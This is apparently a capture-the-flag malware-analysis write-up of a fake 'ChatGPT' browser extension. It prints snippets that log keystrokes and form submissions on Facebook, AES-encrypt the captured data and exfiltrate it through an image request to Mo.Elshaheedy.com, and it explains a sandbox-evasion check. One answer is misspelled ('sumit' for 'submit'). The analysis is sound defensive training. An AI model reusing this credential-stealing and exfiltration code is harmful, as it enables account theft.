# FakeGPT Lab

Category: [Malware Analysis](https://cyberdefenders.org/blueteam-ctf-challenges/?categories=malware-analysis)

Tactics: [Credential Access](https://cyberdefenders.org/blueteam-ctf-challenges/?tactics=credential-access)[Collection](https://cyberdefenders.org/blueteam-ctf-challenges/?tactics=collection)[Command and Control](https://cyberdefenders.org/blueteam-ctf-challenges/?tactics=command-and-control)[Exfiltration](https://cyberdefenders.org/blueteam-ctf-challenges/?tactics=exfiltration)

Tools: [ExtAnalysis](https://cyberdefenders.org/blueteam-ctf-challenges/?tools=extanalysis)[CRX Viewer](https://cyberdefenders.org/blueteam-ctf-challenges/?tools=crx-viewer)

**Scenario**

Your cybersecurity team has been alerted to suspicious activity on your organization's network. Several employees reported unusual behavior in their browsers after installing what they believed to be a helpful browser extension named "ChatGPT". However, strange things started happening: accounts were being compromised, and sensitive information appeared to be leaking.

**Your task** is to perform a thorough analysis of this extension identify its malicious components.

#### Q1 Which encoding method does the browser extension use to obscure target URLs, making them more difficult to detect during analysis?

the extension uses **Base64** to obscure the target URL (`d3d3LmZhY2Vib29rLmNvbQ==` → `www.facebook.com`).\
It also **AES‑encrypts** stolen payloads and then encodes the ciphertext (IV + ciphertext) as Base64 before placing it into the `<img>` URL (and then `encodeURIComponent`).

#### Evidence from the snippet

* `const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];` — that string is a Base64 literal.\
  Example decode: `d3d3LmZhY2Vib29rLmNvbQ==` → `www.facebook.com`.
* `var _0x5eaf = function(_0x5fa1) { return btoa(_0x5fa1); };` — `btoa` is Base64 encoding (though that helper isn’t used here).
* `encryptPayload(...)` uses `CryptoJS.AES.encrypt(...)` and returns `...toString(CryptoJS.enc.Base64)` — AES ciphertext is converted to Base64.
* `sendToServer` builds an `<img>` whose `src` is `https://Mo.Elshaheedy.com/collect?data=` + `encodeURIComponent(encryptedData)` — covert exfiltration via image GET.

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2Fk9zpR4a3pKWhfr0mK9Yy%2FScreenshot%202025-10-03%20at%203.12.03%E2%80%AFPM.png?alt=media&#x26;token=568d1c11-39a0-4b2e-979e-b0a4b3c862cf" alt=""><figcaption></figcaption></figure>

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FhY34Zg8Ti9t0ShKNovMY%2FScreenshot%202025-10-03%20at%203.07.53%E2%80%AFPM.png?alt=media&#x26;token=86e8e81c-9d99-4733-9000-b8f1abadceba" alt=""><figcaption></figcaption></figure>

Based on the context of malicious Chrome extensions like the one in your lab, the most common technique to **obscure target URLs** in the code is **Base64 encoding**.

* Extensions often take URLs or sensitive strings and encode them with Base64 before using them in `<img>` tags or network requests.
* This makes the URLs **less readable** in the source code and in network monitoring tools, hindering static and dynamic analysis.

So, the browser extension likely uses:

**Answer:** `Base64`&#x20;

#### Q2 Which website does the extension monitor for data theft, targeting user accounts to steal sensitive information?

The extension targets [**www.facebook.com**](http://www.facebook.com/) (i.e., Facebook) — the Base64 string `d3d3LmZhY2Vib29rLmNvbQ==` decodes to `www.facebook.com`.

**Answer:** `www.facebook.com`

#### Q3 Which type of HTML element is utilized by the extension to send stolen data?

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FKxYw9LqxJUcOItNBObG9%2FScreenshot%202025-10-03%20at%203.17.36%E2%80%AFPM.png?alt=media&#x26;token=20c770c3-dc63-4dd6-b219-f8d6b462aeb8" alt=""><figcaption></figcaption></figure>

This IIFE (immediately invoked function) is a malicious content script designed to run on web pages. It:

* Checks if the current page hostname matches a hardcoded target (`www.facebook.com` — stored as a Base64 string).
* Listens for form `submit` events and `keydown` events to capture credentials and keystrokes.
* Packages captured data as JSON, encrypts it with AES, Base64-encodes the result, and exfiltrates it by creating an `<img>` element whose `src` contains the encoded payload as a query parameter.

All captured data flows through these functions:

1. `exfiltrateCredentials(username, password)`
   * Builds a JSON payload: `{ user, pass, site }`
   * Encrypts it via `encryptPayload`
   * Sends it with `sendToServer(encryptedPayload)`
2. `exfiltrateData(type, data)`
   * Builds a JSON payload: `{ type, data, site }`
   * Encrypts and sends it the same way
3. `sendToServer(encryptedData)`

   ```js
   var img = new Image();
   img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
   document.body.appendChild(img);
   ```

   * Creates a new `<img>` element and sets its `src` to `https://Mo.Elshaheedy.com/collect?data=<encoded>`.
   * Appends the image to the document body, triggering a GET request to the attacker-controlled domain with the payload in the query string.

**Why `<img>`?** This covert channel uses browser image fetching to send a GET without needing XHR/fetch (less likely to trigger CORS preflight or obvious network signatures).

**Answer:**  **`<img>`**&#x20;

#### Q4 What is the first specific condition in the code that triggers the extension to deactivate itself?

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FHxW2CMEJKxaBGvCS9nQU%2FScreenshot%202025-10-03%20at%203.23.16%E2%80%AFPM.png?alt=media&#x26;token=54dbf492-112c-4609-b6ab-1fb78f2677bd" alt=""><figcaption></figcaption></figure>

**checks**

* It tests whether the browser reports **no installed plugins** (i.e., `navigator.plugins.length` equals 0).

**Why attackers use it**

* Many analysis sandboxes and headless browsers expose *no* installed plugins → `length === 0` is a cheap heuristic for “running in an automated/virtual environment”.
* Combined with other checks (e.g., `HeadlessChrome` in UA) it becomes an anti‑analysis gate: if true, the malware may disable or hide malicious behavior.

`navigator.plugins.length === 0` checks whether the browser reports **no installed plugins**.\
Attackers use it as a cheap sandbox/headless detection — many automated analysis environments show zero plugins, so malware can disable malicious behavior when this is true.\
Limitation: it produces false positives (legit browsers may show no plugins) and is easy to spoof.\
Quick bypass: override `navigator.plugins` in the page (e.g., define a fake non-empty plugins getter) to make the check return false.

**Answer:**  navigator.plugins.length === 0

#### Q5 Which event does the extension capture to track user input submitted through forms?

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FRfScEg0viiMGIW1vrRy4%2FScreenshot%202025-10-03%20at%203.26.44%E2%80%AFPM.png?alt=media&#x26;token=48364ecc-f826-4d55-8196-64c889d2ad87" alt=""><figcaption></figcaption></figure>

It listens for the **`submit`** event on `document` — capturing form submissions and extracting fields via `new FormData(event.target)`(e.g., `username`/`email` and `password`).

**Answer:** **`sumit`**

#### Q6 Which API or method does the extension use to capture and monitor user keystrokes?

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FGlGpxTBkQZxqm3vgR6vg%2FScreenshot%202025-10-03%20at%203.29.27%E2%80%AFPM.png?alt=media&#x26;token=8b91fc05-b6c8-4041-8eee-32489bcd2910" alt=""><figcaption></figcaption></figure>

The extension registers a **`keydown`** event listener on `document` via `document.addEventListener('keydown', ...)` and reads `event.key` to capture each keystroke.

**Answer:** **`keydown`**

#### Q7 What is the domain where the extension transmits the exfiltrated data?

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FbG1TbkuyopGoM9yx11Mw%2FScreenshot%202025-10-03%20at%203.32.55%E2%80%AFPM.png?alt=media&#x26;token=887ab750-b54b-4ef9-b915-627a007f8d37" alt=""><figcaption></figcaption></figure>

**Mo.Elshaheedy.com** (the extension sends data to `https://Mo.Elshaheedy.com/collect`).

```javascript
function sendToServer(encryptedData) {
        var img = new Image();
        img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
        document.body.appendChild(img);
```

**Answer: `Mo.Elshaheedy.com`**

#### Q8 Which function in the code is used to exfiltrate user credentials, including the username and password?

The function **`exfiltrateCredentials(username, password)`** — it builds the JSON payload, encrypts it with `encryptPayload(...)`, and sends it via `sendToServer(...)`.

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FspZFsJOOZUoO2jktDEC1%2FScreenshot%202025-10-03%20at%203.35.32%E2%80%AFPM.png?alt=media&#x26;token=cfced94a-a489-4155-b089-d582a3602bd3" alt=""><figcaption></figcaption></figure>

**Answer: `exfiltrateCredentials(username, password);`**

#### Q9 Which encryption algorithm is applied to secure the data before sending?

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FLHGOEIXvxG4IlTOmde34%2FScreenshot%202025-10-03%20at%203.37.48%E2%80%AFPM.png?alt=media&#x26;token=7930d5e1-2a7b-4c59-8450-2628839bb7df" alt=""><figcaption></figcaption></figure>

The extension uses **AES (Advanced Encryption Standard)** via **CryptoJS.AES.encrypt** to encrypt the data before exfiltration.

**Answer: AES**

#### Q10 What does the extension access to store or manipulate session-related data and authentication information?

The extension accesses **cookies** (via the `"cookies"` permission) to store or manipulate session-related data and authentication information.

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FhVWjdm160ORRIaNTpYaP%2FScreenshot%202025-10-03%20at%203.40.47%E2%80%AFPM.png?alt=media&#x26;token=40b7438c-8797-4a0c-a12d-d9330ac85a37" alt=""><figcaption></figcaption></figure>

**Answer:** `cookies`

[`https://cyberdefenders.org/blueteam-ctf-challenges/achievements/Napol/fakegpt/` ](https://cyberdefenders.org/blueteam-ctf-challenges/achievements/Napol/fakegpt/)
